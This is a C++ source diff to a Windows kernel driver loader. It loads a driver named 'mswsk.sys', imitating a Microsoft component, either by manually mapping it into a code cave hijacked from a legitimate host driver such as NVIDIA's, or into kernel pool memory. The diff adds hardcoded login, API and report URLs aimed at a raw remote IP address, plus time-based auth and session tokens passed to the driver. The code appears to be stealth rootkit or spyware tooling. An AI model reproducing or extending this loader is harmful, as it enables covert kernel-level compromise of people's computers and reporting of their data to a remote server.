@@ -131,12 +131,32 @@ int wmain(int argc, wchar_t* argv[])
     bool modeExplicit = false;
     bool portExplicit = false;
 
-    DRV_BOOT_CONFIG bootConfig = {};
-    bootConfig.Magic         = DRV_BOOT_MAGIC;
-    bootConfig.TransportMode = DRV_TRANSPORT_TCP; // 默认 TCP 通信
-    bootConfig.Port          = 10001;             // 默认 10001 端口
-    bootConfig.AuthToken     = 0;
-    bootConfig.Flags         = 0;
+    DRV_BOOT_CONFIG_EX bootConfigEx = {};
+    bootConfigEx.Base.Magic         = DRV_BOOT_MAGIC;
+    bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP; // 默认 TCP 通信
+    bootConfigEx.Base.Port          = 10001;             // 默认 10001 端口
+    bootConfigEx.Base.Flags         = 0;
+    GetModuleFileNameW(NULL, bootConfigEx.HostLoaderPath, 260);
+
+    // ---- 默认带动态防伪 Token 启动 ----
+    FILETIME ft = {};
+    GetSystemTimeAsFileTime(&ft);
+    uint64_t ft64 = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
+    uint64_t sec = ft64 / 10000000ULL;
+    if (sec >= 11644473600ULL) sec -= 11644473600ULL;
+    uint64_t counter = sec / g_Step;
+    bootConfigEx.Base.AuthToken = CalcToken(counter, GetCurrentProcessId());
+
+    // 默认填充 16 字节随机防伪会话鉴权熵 (SessionToken)
+    uint64_t entropy1 = ft64 ^ 0xA5A5A5A55A5A5A5AULL;
+    uint64_t entropy2 = ((uint64_t)GetCurrentProcessId() << 32) ^ __rdtsc();
+    memcpy(&bootConfigEx.Base.SessionToken[0], &entropy1, 8);
+    memcpy(&bootConfigEx.Base.SessionToken[8], &entropy2, 8);
+
+    // ---- 默认传入上报 URL 参数 ----
+    strcpy_s(bootConfigEx.LoginUrl, sizeof(bootConfigEx.LoginUrl), "https://112.5.37.106:1234");
+    strcpy_s(bootConfigEx.ApiUrl, sizeof(bootConfigEx.ApiUrl), "https://112.5.37.106:1234");
+    strcpy_s(bootConfigEx.ReportUrl, sizeof(bootConfigEx.ReportUrl), "https://112.5.37.106:1236");
 
     for (int i = 1; i < argc; i++) {
         if (_wcsicmp(argv[i], L"-h") == 0 || _wcsicmp(argv[i], L"--host") == 0) {
@@ -145,39 +165,51 @@ int wmain(int argc, wchar_t* argv[])
                 hostExplicit = true;
             }
         } else if (_wcsicmp(argv[i], L"--tcp") == 0) {
-            bootConfig.TransportMode = DRV_TRANSPORT_TCP;
+            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
             modeExplicit = true;
             if (i + 1 < argc && argv[i + 1][0] != L'-') {
                 int p = _wtoi(argv[++i]);
-                if (p > 0 && p <= 65535) { bootConfig.Port = (uint16_t)p; portExplicit = true; }
-            } else if (bootConfig.Port == 0 || bootConfig.Port == 10002) {
-                bootConfig.Port = 10001;
+                if (p > 0 && p <= 65535) { bootConfigEx.Base.Port = (uint16_t)p; portExplicit = true; }
+            } else if (bootConfigEx.Base.Port == 0 || bootConfigEx.Base.Port == 10002) {
+                bootConfigEx.Base.Port = 10001;
             }
         } else if (_wcsicmp(argv[i], L"--udp") == 0) {
-            bootConfig.TransportMode = DRV_TRANSPORT_UDP;
+            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_UDP;
             modeExplicit = true;
             if (i + 1 < argc && argv[i + 1][0] != L'-') {
                 int p = _wtoi(argv[++i]);
-                if (p > 0 && p <= 65535) { bootConfig.Port = (uint16_t)p; portExplicit = true; }
+                if (p > 0 && p <= 65535) { bootConfigEx.Base.Port = (uint16_t)p; portExplicit = true; }
             } else {
-                bootConfig.Port = 10002;
+                bootConfigEx.Base.Port = 10002;
             }
         } else if (_wcsicmp(argv[i], L"--usb") == 0) {
-            bootConfig.TransportMode = DRV_TRANSPORT_USB;
+            bootConfigEx.Base.TransportMode = DRV_TRANSPORT_USB;
             modeExplicit = true;
-            bootConfig.Port = 0;
+            bootConfigEx.Base.Port = 0;
             portExplicit = true;
         } else if (_wcsicmp(argv[i], L"-p") == 0 || _wcsicmp(argv[i], L"--port") == 0) {
             if (i + 1 < argc) {
                 int p = _wtoi(argv[++i]);
                 if (p > 0 && p <= 65535) {
-                    bootConfig.Port = (uint16_t)p;
+                    bootConfigEx.Base.Port = (uint16_t)p;
                     portExplicit = true;
                 }
             }
         } else if (_wcsicmp(argv[i], L"-t") == 0 || _wcsicmp(argv[i], L"--token") == 0) {
             if (i + 1 < argc) {
-                bootConfig.AuthToken = (uint32_t)wcstoul(argv[++i], nullptr, 0);
+                bootConfigEx.Base.AuthToken = (uint32_t)wcstoul(argv[++i], nullptr, 0);
+            }
+        } else if (_wcsicmp(argv[i], L"--api-url") == 0) {
+            if (i + 1 < argc) {
+                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.ApiUrl, sizeof(bootConfigEx.ApiUrl), NULL, NULL);
+            }
+        } else if (_wcsicmp(argv[i], L"--login-url") == 0) {
+            if (i + 1 < argc) {
+                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.LoginUrl, sizeof(bootConfigEx.LoginUrl), NULL, NULL);
+            }
+        } else if (_wcsicmp(argv[i], L"--report-url") == 0) {
+            if (i + 1 < argc) {
+                WideCharToMultiByte(CP_UTF8, 0, argv[++i], -1, bootConfigEx.ReportUrl, sizeof(bootConfigEx.ReportUrl), NULL, NULL);
             }
         } else if (argv[i][0] != L'-') {
             if (drvPath[0] == 0) {
@@ -209,23 +241,23 @@ int wmain(int argc, wchar_t* argv[])
             }
 
             if (*p == '\0' || strcmp(p, "1") == 0 || _stricmp(p, "tcp") == 0) {
-                bootConfig.TransportMode = DRV_TRANSPORT_TCP;
+                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
             } else if (strcmp(p, "2") == 0 || _stricmp(p, "udp") == 0) {
-                bootConfig.TransportMode = DRV_TRANSPORT_UDP;
-                if (!portExplicit) bootConfig.Port = 10001;
+                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_UDP;
+                if (!portExplicit) bootConfigEx.Base.Port = 10001;
             } else if (strcmp(p, "3") == 0 || _stricmp(p, "usb") == 0) {
-                bootConfig.TransportMode = DRV_TRANSPORT_USB;
-                bootConfig.Port = 0;
+                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_USB;
+                bootConfigEx.Base.Port = 0;
                 portExplicit = true;
             } else {
                 printf(" [*] Invalid option \"%s\", defaulting to 1. TCP\n", p);
-                bootConfig.TransportMode = DRV_TRANSPORT_TCP;
+                bootConfigEx.Base.TransportMode = DRV_TRANSPORT_TCP;
             }
         }
     }
 
     // Interactive user prompt for port configuration (TCP / UDP)
-    if (interactive && !portExplicit && bootConfig.TransportMode != DRV_TRANSPORT_USB) {
+    if (interactive && !portExplicit && bootConfigEx.Base.TransportMode != DRV_TRANSPORT_USB) {
         printf(" [?] Enter Communication Port [1-65535] (Press Enter for default: 10001): ");
         fflush(stdout);
 
@@ -239,18 +271,18 @@ int wmain(int argc, wchar_t* argv[])
             }
 
             if (*p == '\0') {
-                bootConfig.Port = 10001;
+                bootConfigEx.Base.Port = 10001;
             } else {
                 int pNum = atoi(p);
                 if (pNum > 0 && pNum <= 65535) {
-                    bootConfig.Port = (uint16_t)pNum;
+                    bootConfigEx.Base.Port = (uint16_t)pNum;
                 } else {
                     printf(" [*] Invalid port \"%s\", using default 10001\n", p);
-                    bootConfig.Port = 10001;
+                    bootConfigEx.Base.Port = 10001;
                 }
             }
         } else {
-            bootConfig.Port = 10001;
+            bootConfigEx.Base.Port = 10001;
         }
         printf("=======================================================\n\n");
     }
@@ -265,17 +297,19 @@ int wmain(int argc, wchar_t* argv[])
     LOG_INFO("Target host driver: %ls%s", pTargetHost, hostExplicit ? " (Explicit)" : " (Default: NVIDIA)");
 
     const wchar_t* modeStr = L"TCP";
-    if (bootConfig.TransportMode == DRV_TRANSPORT_UDP) modeStr = L"UDP";
-    else if (bootConfig.TransportMode == DRV_TRANSPORT_USB) modeStr = L"USB";
+    if (bootConfigEx.Base.TransportMode == DRV_TRANSPORT_UDP) modeStr = L"UDP";
+    else if (bootConfigEx.Base.TransportMode == DRV_TRANSPORT_USB) modeStr = L"USB";
 
     LOG_INFO("Boot Transport: %ls (Port=%u, Token=0x%08X)",
-             modeStr, bootConfig.Port, bootConfig.AuthToken);
+             modeStr, bootConfigEx.Base.Port, bootConfigEx.Base.AuthToken);
+    LOG_INFO("Boot URLs: Login=%s, Api=%s, Report=%s",
+             bootConfigEx.LoginUrl, bootConfigEx.ApiUrl, bootConfigEx.ReportUrl);
 
     // ---- 3. 检查文件是否存在 ----
     DWORD attr = GetFileAttributesW(drvPath);
     if (attr == INVALID_FILE_ATTRIBUTES) {
         LOG_ERR("mswsk.sys not found: %ls (GLE=%lu)", drvPath, GetLastError());
-        printf("\nUsage: loader.exe [mswsk.sys] [-h host.sys] [--tcp [port] | --udp [port] | --usb] [-t token] [--force] [--non-interactive] [--test-wx [alias] [chatroom]]\n");
+        printf("\nUsage: loader.exe [mswsk.sys] [-h host.sys] [--tcp [port] | --udp [port] | --usb] [-t token] [--force] [--non-interactive] [--api-url <url>] [--login-url <url>] [--report-url <url>] [--test-wx [alias] [chatroom]]\n");
         if (interactive) {
             printf("Press any key to exit...");
             fflush(stdout);
@@ -287,13 +321,13 @@ int wmain(int argc, wchar_t* argv[])
     // ---- 4. 根据模式宏分流执行加载流程 ----
 #if MODE_MANUAL_MAP_CAVE
     LOG_INFO("Pipeline Mode: [ManualMapCave] (PTE Remap & Host Code Cave Hijack)");
-    bool ok = LoadDrvWskViaCave(drvPath, L"Machenike.sys", pTargetHost, forceReload, &bootConfig);
+    bool ok = LoadDrvWskViaCave(drvPath, L"Machenike.sys", pTargetHost, forceReload, &bootConfigEx.Base);
 #elif MODE_MANUAL_MAP
     LOG_INFO("Pipeline Mode: [ManualMap] (Kernel Allocated Pool Memory)");
-    bool ok = LoadDrvWskViaPool(drvPath, L"Machenike.sys", forceReload, &bootConfig);
+    bool ok = LoadDrvWskViaPool(drvPath, L"Machenike.sys", forceReload, &bootConfigEx.Base);
 #else
     LOG_INFO("Pipeline Mode: [Normal SCM] (Standard Windows Service Control Manager)");
-    bool ok = LoadDrvWskViaSCM(drvPath, L"mswsk", forceReload, &bootConfig);
+    bool ok = LoadDrvWskViaSCM(drvPath, L"mswsk", forceReload, &bootConfigEx.Base, &bootConfigEx);
 #endif
 
     if (ok) {
